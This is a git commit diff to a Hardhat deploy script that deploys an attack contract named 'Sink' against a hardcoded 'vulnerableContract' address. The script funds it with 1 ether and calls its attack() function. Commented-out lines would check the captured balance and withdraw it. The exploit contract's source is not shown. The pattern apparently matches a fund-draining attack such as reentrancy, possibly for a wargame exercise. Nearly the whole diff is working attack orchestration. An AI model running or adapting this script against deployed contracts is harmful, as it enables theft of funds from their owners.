8bbb2dffc5754f037513972b75e0e001552e1b61
Tha Franklin <thalita.franklyn@gmail.com>
2022-02-04 17:27:33 -0300

    first commit

--- scripts/deploy.js
+++ scripts/deploy.js
@@ -1,15 +1,44 @@
+const { ethers } = require("hardhat");
 const hre = require("hardhat");
 
 async function main() {
-    const [deployer] = await hre.ethers.getSigners();
+    const [deployer] = await ethers.getSigners();
+    const vulnerableContract = "0xF81A1dd745AC795d1E253ED7bFE4b774631153b1";
+    
+    console.log("Account balance:", (await deployer.getBalance()).toString());
 
-    const SampleContract = await hre.ethers.getContractFactory("SampleContract");
-    const sampleContract = await SampleContract.deploy();
+    const AttackContract = await ethers.getContractFactory("Sink");
+    const attack = await AttackContract.deploy(vulnerableContract);
 
-    await sampleContract.deployed();
-    console.log("Sample Contract address:", sampleContract.address);
+    await attack.deployed();
+    console.log("Attack Contract address:", attack.address);
 
-    saveFrontendFiles(sampleContract);
+    saveFrontendFiles(attack);
+
+    // make a deposit to contract address so it can withdraw later
+    await deployer.sendTransaction({
+      to: attack.address,
+      value: ethers.utils.parseEther('1')
+      // gasLimit: BigNumber('100000000')
+    });
+
+    let balance = await attack.myDonation(attack.address);
+    console.log('donation: '+ balance.toString());
+
+    // if (balance > 0) {
+    await attack.connect(deployer).attack();
+    // }
+
+    // let contract_balance = await attack.myBalance();
+    // console.log('attack result: '+ contract_balance.toString());
+
+    // if (contract_balance > 0) {
+    //   await attack.connect(deployer).withdraw();
+    //   console.log('withdraw successful!')
+    // }
+    // else {
+    //   console.log('nothing to withdraw!')
+    // }
 
 }
 
@@ -23,16 +52,17 @@ function saveFrontendFiles(contract) {
 
     fs.writeFileSync(
         contractsDir + "/contract-address.json",
-        JSON.stringify({ SampleContract: contract.address }, undefined, 2)
+        JSON.stringify({ AttackContract: contract.address }, undefined, 2)
     );
 
-    const SampleContractArtifact = artifacts.readArtifactSync("SampleContract");
+    const ContractArtifact = artifacts.readArtifactSync("Sink");
 
     fs.writeFileSync(
-        contractsDir + "/SampleContract.json",
-        JSON.stringify(SampleContractArtifact, null, 2)
+        contractsDir + "/AttackContract.json",
+        JSON.stringify(ContractArtifact, null, 2)
     );
 }
+
 
 main()
     .then(() => process.exit(0))
